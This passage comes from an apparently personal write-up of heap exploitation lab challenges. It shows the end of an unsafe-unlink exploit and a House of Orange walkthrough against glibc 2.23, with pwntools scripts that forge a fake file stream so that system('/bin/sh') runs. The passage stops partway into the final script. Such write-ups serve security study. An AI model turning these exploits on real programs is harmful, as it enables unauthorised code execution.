</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_a</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk_b</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_prev</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk_size</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;m_array&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;m_array&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>nop</span> <span class=o>=</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=mh>0x88</span> <span class=o>-</span> <span class=mi>8</span><span class=o>*</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_prev_size</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_size</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>chunk_prev</span> <span class=o>+</span> <span class=n>chunk_size</span> <span class=o>+</span> <span class=n>fd</span> <span class=o>+</span> <span class=n>bk</span> <span class=o>+</span> <span class=n>nop</span> <span class=o>+</span> <span class=n>fake_prev_size</span> <span class=o>+</span> <span class=n>fake_size</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>overlapped_mparray</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>overlapped_mparray</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=house-of-orange>House of Orange</h2><p><em><strong>This challenge is in the Linux Heap Exploitation - Part 1, and it is worth to write something about it.</strong></em></p><h3 id=overall-4>Overall</h3><p><img src=https://hackmd.io/_uploads/ByHYuw240.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/BJiEGP24A.png loading=lazy alt=image></p><p>Challenge gives me 4 options as the image above.</p><p><img src=https://hackmd.io/_uploads/HJ2e7P2VR.png loading=lazy alt=image></p><ul><li>If i only request malloc(small) and edit with data: aaaaa</li></ul><p><img src=https://hackmd.io/_uploads/SktOfvnE0.png loading=lazy alt=image></p><ul><li>malloc(small): call malloc() with the size 0x20</li><li>malloc(large): call malloc() with the size 0xfd0</li><li>edit: write data to the start of small chunk</li><li>quit: simply exit the program.</li></ul><p><em><strong>However the challenge doesn&rsquo;t give me free()&mldr;</strong></em></p><h4 id=bug>Bug</h4><p><img src=https://hackmd.io/_uploads/Hk-TQP34C.png loading=lazy alt=image></p><p><em><strong>As you see, I can overwrite the heap.</strong></em></p><h3 id=approach-4>Approach</h3><h4 id=create-free-chunk>Create free chunk</h4><p>The challenge doesn&rsquo;t give me free option(), but it allows me to overwrite the heap(chunk size, prev_size,&mldr;.. include of top chunk size).</p><p><img src=https://hackmd.io/_uploads/HyYzBD34C.png loading=lazy alt=image></p><ul><li>Document for <em><strong>top chunk</strong></em> in <em><strong>HeapLab - GLIBC Heap Exploitation.pdf</strong></em></li></ul><p>I can create an unsorted bin by <strong>overwriting the size field of the top chunk</strong> -> <strong>request a larger size</strong> than this size.</p><p>Main Arena will use brk syscall to request the new memory from kernel. Because the new memory doesn&rsquo;t border the end of the heap. Thus, malloc assume that the kernel was unable to map contiguous memory from the heap. Since the new memory is larger, malloc starts a new heap from it(set top chunk pointer to the new memory) and so as not to waste space, it frees the old top chunk.</p><h5 id=notice>Notice</h5><blockquote><p>Malloc keeps track of the remaining memory in a top chunk using its size field, the prev_inuse bit of
which is always set. A top chunk always contains enough memory to allocate a minimum-sized chunk
and always ends on a page boundary.</p></blockquote><h5 id=overwiting-top-chunk-size-with-0x1000---0x20--1-then-request-the-large-size>Overwiting top chunk size with: <strong>0x1000 - 0x20 + 1</strong>, then request the large size</h5><h5 id=the-result>The result</h5><p><img src=https://hackmd.io/_uploads/SJEwdPhVC.png loading=lazy alt=image></p><h4 id=find-the-target>Find the target</h4><h5 id=unsortedbin-attack>Unsortedbin attack</h5><p>I can write the address of unsortedbin to somewhere(fd + 0x10) by following bk pointer to overwrite this address to fd poiner.</p><h5 id=target-file-stream>Target file stream</h5><p>If the program uses fopen or something else, the file steam will be used. Or if not, there will also be one because the program always contains stdin(0), stdout(1), and stderr(2).</p><p><img src=https://hackmd.io/_uploads/SklBiw240.png loading=lazy alt=image></p><p><em><strong>However, what if I target one of the standard I/O vtable pointer.</strong></em></p><ul><li>Our unsortedbin attack would replace that vtable pointer with the address of the main arena&rsquo;s unsortedbin. Then the next time a standard I/O member function was called, the main arena would be treated as a vtable.</li><li>The main arena consists primarily of empty linked lists at this point, and attempting to execute those addresses would just lead to a general protection fault as we tried to execute memory marked as non-executable. Even if I were to populate some of those bins with pointers to heap memory by sorting chunks into them, heaps are no more executable than arenas.</li></ul><p><em><strong>Fortunately, I have _IO_list_all pointer(the head of a list of every file stream).</strong></em></p><p><img src=https://hackmd.io/_uploads/SJf72PnEA.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/rk-r2PnVA.png loading=lazy alt=image></p><ul><li>This process has open and it&rsquo;s used when GLIBC needs to perform an operation on all open file streams, typically cleanup procedures. One of those cleanup procedures is performed when a program exits, either via the GLIBC exit() function or by returning from its main() function.</li></ul><p><strong>Conclusion</strong></p><ul><li>I will target the _IO_list_all pointer with our unsortedbin attack, replacing it with a pointer into the main arena, then we exit the program. As the program exits and GLIBC cleans up, it will attempt to flush the buffers of any open file streams.</li><li>It does this by iterating over every file stream in the _IO_list_all list, determining whether its buffers require flushing, and if so, calling a specific member function named &lsquo;overflow&rsquo; on that file stream, nothing to do with this sort of overflows.</li></ul><h5 id=script-3>Script</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./house_of_orange&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.23/libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+287
</span></span></span><span class=line><span class=cl><span class=s2>b *main+353
</span></span></span><span class=line><span class=cl><span class=s2>b *main+412
</span></span></span><span class=line><span class=cl><span class=s2>b *main+478
</span></span></span><span class=line><span class=cl><span class=s2>b *_IO_flush_all_lockp
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc_small</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc_large</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1>#io.sendline(b&#39;2&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#io.recvuntil(b&#39;&gt; &#39;)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendthen</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;heap @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#===============================================================================================</span>
</span></span><span class=line><span class=cl><span class=c1># Create unsortedbin list</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc_small</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#overwrite top chunk size field to initial new heap from kernel</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Y&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1000</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>+</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc_large</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#===============================================================================================</span>
</span></span><span class=line><span class=cl><span class=c1>#unsortedbin attack</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mh>0x21</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>unsortedbin_attack</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;Y&#39;</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>size</span><span class=p>)</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>p64</span><span class=p>(</span><span class=n>fd</span><span class=p>)</span>  <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bk</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>unsortedbin_attack</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc_small</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>quit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=set-up>Set up</h4><p><img src=https://hackmd.io/_uploads/ryPTeu240.png loading=lazy alt=image></p><p>Now, I have what I want.</p><p><img src=https://hackmd.io/_uploads/ByXv-_n40.png loading=lazy alt=image></p><ul><li><p>However, the program get segmentation fault.</p></li><li><p>And _IO_flush_all_lockp() uses to determine whether a file stream requires flushing.</p></li><li><p>The reason for that is this file stream doesn&rsquo;t pass the check.</p><ul><li><img src=https://hackmd.io/_uploads/SJH3-u340.png loading=lazy alt=image></li><li>After all this function is trying to treat the main arena like a file stream. The line containing _IO_OVERFLOW in all caps is the one calling the &lsquo;overflow&rsquo; member function. The first argument, &lsquo;fp&rsquo;, represents the file stream overflow() is being called from.</li><li>There are two checks prior to this line, each one of which must pass in order for overflow() to be called.<ul><li>The first check passes if the &lsquo;_mode&rsquo; field of the file stream is less than or equal to zero and its _IO_write_ptr field is larger than its _IO_write_base field.</li><li>The second check _mode larger than zero.</li></ul></li><li>It will fail the first check due to the latter and the second check due to the former.</li></ul></li><li><p>In this case _IO_flush_all_lockp() won&rsquo;t call this file stream&rsquo;s overflow() function and will instead move on to the next stream the current stream&rsquo;s _chain pointer(_chain points back into the main arena).</p><ul><li><img src=https://hackmd.io/_uploads/S1NAp_hVR.png loading=lazy alt=image></li><li><img src=https://hackmd.io/_uploads/SJuIHOhVA.png loading=lazy alt=image></li><li><em><strong>The bk of the 0x60 smallbin is what&rsquo;s being treated as this rogue file stream&rsquo;s _chain pointer.</strong></em></li></ul></li><li><p>So if we change the size field of the old top chunk from 0x21 to 0x61 before our unsortedbin attack, the old top chunk will be sorted into the 0x60 smallbin rather than being allocated, and end up as the _chain pointer of the rogue file stream overlapping the main arena. This allows me to forge our own fake file stream on the heap, providing our own vtable pointer and vtable entries</p></li></ul><p><em><strong>Let&rsquo;s build the fake file stream.</strong></em></p><p>Change my script little</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mh>0x61</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>unsortedbin_attack</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;Y&#39;</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>size</span><span class=p>)</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>p64</span><span class=p>(</span><span class=n>fd</span><span class=p>)</span>  <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bk</span><span class=p>)</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>unsortedbin_attack</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc_small</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>quit</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/SkjaLuhNR.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/HyslvO2V0.png loading=lazy alt=image></p><p><strong>Now, we need to pass the check</strong></p><ul><li><code>fp > write_ptr > write_base</code></li><li><code>fp -> mode &lt;= 0</code></li></ul><p>Afterwards, I need to set up to call system("/bin/sh").</p><ul><li>I provide a vtable pointer to a vtable in which the overflow() entry is populated by the function.</li><li>When the overflow() function is called, its first argument is the address of the file stream it&rsquo;s called from. That means if I write the string &ldquo;/bin/sh&rdquo; into the first quadword of our file stream, which is where the &lsquo;_flags&rsquo; field resides, then point the overflow() vtable entry at the GLIBC system() function, the call becomes system("/bin/sh") and I get a shell without the need for a one-gadget.</li></ul><h3 id=complete-script>Complete script</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./house_of_orange&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.23/libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = elf.libc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+287
</span></span></span><span class=line><span class=cl><span class=s2>b *main+353
</span></span></span><span class=line><span class=cl><span class=s2>b *main+412
</span></span></span><span class=line><span class=cl><span class=s2>b *main+478
</span></span></span><span class=line><span class=cl><span class=s2>b *_IO_flush_all_lockp
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
